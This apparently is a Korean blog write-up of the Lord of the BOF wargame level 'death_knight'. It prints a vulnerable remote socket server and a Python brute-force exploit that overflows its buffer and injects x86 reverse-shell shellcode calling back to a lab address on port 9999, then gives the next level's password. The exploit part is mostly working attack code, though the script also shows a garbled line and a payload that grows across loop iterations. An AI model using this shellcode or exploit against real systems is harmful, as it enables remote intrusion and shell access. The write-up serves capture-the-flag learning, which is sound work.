---
layout: single
title: "LOB xavius -> death_night"
#description: ""
date: 2016-02-05 12:00:00 -0400
# modified: 
tags: 
- WarGame
- WriteUp
- Pwnable
comments: true
share: true
---

source code:

```c

1  /*
2          The Lord of the BOF : The Fellowship of the BOF
3          - dark knight
4          - remote BOF
5  */
6  
7  #include <stdio.h>
8  #include <stdlib.h>
9  #include <errno.h>
10 #include <string.h>
11 #include <sys/types.h>
12 #include <netinet/in.h>
13 #include <sys/socket.h>
14 #include <sys/wait.h>
15 #include <dumpcode.h>
16 
17 main()
18 {
19         char buffer[40];
20 
21         int server_fd, client_fd;
22         struct sockaddr_in server_addr;
23         struct sockaddr_in client_addr;
24         int sin_size;
25 
26         if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
27                 perror("socket");
28                 exit(1);
29         }
30 
31         server_addr.sin_family = AF_INET;
32         server_addr.sin_port = htons(6666);
33         server_addr.sin_addr.s_addr = INADDR_ANY;
34         bzero(&(server_addr.sin_zero), 8);
35 
36         if(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1){
37                 perror("bind");
38                 exit(1);
39         }
40 
41         if(listen(server_fd, 10) == -1){
42                 perror("listen");
43                 exit(1);
44         }
45 
46         while(1) {
47                 sin_size = sizeof(struct sockaddr_in);
48                 if((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size)) == -1){
49                         perror("accept");
50                         continue;
51                 }
52 
53                 if (!fork()){
54                         send(client_fd, "Death Knight : Not even death can save you from me!\n", 52, 0);
55                         send(client_fd, "You : ", 6, 0);
56                         recv(client_fd, buffer, 256, 0);
57                         close(client_fd);
58                         break;
59                 }
60 
61                 close(client_fd);
62                 while(waitpid(-1,NULL,WNOHANG) > 0);
63         }
64         close(server_fd);
65 }

```

평범한 소켓 통신 서버 역할을 하는 프로그램이며, 원격접속한 사용자로부터 입력값을 받고 있다. 그리고 이를 통해 Buffer Overflow(이하 BOF)가 발생하게 된다. 그리고 이전의 문제들과 다르게 이 버퍼에는 아무런 보호조치가 되어있지 않다. 결국 이 문제는 원격지에서 이 LOB 서버로 접속한 후, 쉘코드와 함께 bof를 발생시키면 된다. 우선 따로 만든 공격지에서 LOB 서버 6666번 포트로 nc 명령어를 사용하였다.

![nc]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-20/0.png)

위와 같이 입력값을 받고 있다.
공격지인 다른 리눅스 로컬로 리버스 쉘코드를 사용한 브루트 포스 코드를 작성해 두었다. 원격에서 공격하는 만큼 ret주소를 알 수 없기 때문에 브루트 포스를 사용했다.


Reverse shellcode 출처: https://orang.tistory.com/entry/%ED%95%B4%EC%BB%A4%EC%8A%A4%EC%BF%A8-LOB-xavius-deathknight-by-ORANG

```c

1  import sys, struct, socket
2  
3  host = "192.168.235.135"
4  port = 6666
5  
6  hexhost = "\xc0\xa8\xeb\x8a" # 192.168.235.138
7  recvhexport = "\x27\x0f" # port 9999
8  
9  shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68" + hexhost + "\x68\x02\x00" + recvhexport + "\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"10 
11 padding1 = "A" * 44
12 padding2 = "\x90" * 50
13 payload = ""
14 
15 for i in range(0xff, 0xf0, -1):
16 	for j in range(0xff, 0x00, -1):
17 		for k in range(0xff, 0x00, -1):
18 		 	r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
19 		 	r.connect((host, port))
20 		 	retaddr = chr(k) + chr(j) + chr(i) + "\xbf"
21 		 	print("RET: " + str(hex(struct.unpack("I", retaddr)[0])))
22 		 	payload += padding1
23 		 	payload += retaddr
24 		 	payload += padding2
25 		 	payload += shellcode
26 		 	print(r.recv(52))
27 		 	print(r.recv(6))
28 		 	r.send(payload)
29 		 	r.close()

```

LOB 서버에 6666번 포트로 연결하고, receive를 9999번 포트로 받으려고 한다.

![nc2]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-20/1.png)

nc로 공격지에서 listen 모드로 9999번 포트를 열어두고, 위의 브루트포스 코드를 실행시킨다.

![exploit]({{site.url}}{{site.baseurl}}/assets/images/2016-02-05-LOB-20/2.png)


my-pass: got the life